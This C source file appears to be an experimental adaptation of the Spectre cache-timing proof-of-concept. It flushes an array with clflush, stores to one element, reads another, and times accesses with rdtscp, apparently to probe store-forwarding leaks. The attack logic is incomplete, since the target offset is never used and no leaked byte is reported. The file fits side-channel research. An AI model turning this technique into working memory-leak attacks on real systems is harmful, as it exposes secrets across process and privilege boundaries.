/* Compile with "gcc -O0 -std=gnu99" */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
#include <inttypes.h>

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];
uint8_t bigArray[4096 * 512];
char * secret = "The password is rootkea";
uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function() {
  
    bigArray[0] = 55;


}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i, junk;
  uint8_t data = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;
  bigArray[4096] = 100;


  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 1; tries > 0; tries--) {

    /* Flush big array[4096*(0..255)] from cache */
    for (i = 0; i < 4096; i++)
      _mm_clflush( & bigArray[i * 512]); /* intrinsic for clflush instruction */

        
    /* Call the victim! */
    victim_function(); //store in big[0]
   

    addr = &bigArray[4096];
    data = *addr;
    //Now the data from bigArray[0] is supposed to temporary be in (data) so we will access this point

    temp &= array2[data * 512];

    //Now we accessed the point in the memory that is correlated with the data in big[0]
    //Now we can see in which place in big we have a speed up

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
        mix_i = ((i * 167) + 13) & 255;
        addr = &array2[mix_i * 512];
        time1 = __rdtscp(&junk); /* READ TIMER */
        junk = *addr; /* MEMORY ACCESS TO TIME */
        time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
        if (time2 <= CACHE_HIT_THRESHOLD ) { //TODO: also check it is not the thing in 4096
            results[mix_i]++; /* cache hit - add +1 to score for this value */
            printf("Time to get %d is fast:", i);
            printf("%" PRId64 "\n", time2);
        }
            
    }


    //addr = &bigArray[4096];
    //time1 = __rdtscp(&data); /* READ TIMER */
    //data = *addr; /* MEMORY ACCESS TO TIME */
    //time2 = __rdtscp(&data) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
    //printf("Time to get 4096 is:");
    //printf("%" PRId64 "\n", time2); 
    results[0] ^= data;


  }
}

int main(int argc, const char * * argv) {
  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
  int i, score[2], len = 23;
  uint8_t value[2];
  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

  while (--len >= 0) {
    readMemoryByte(malicious_x++, value, score);
    
  }
  return (0);
}
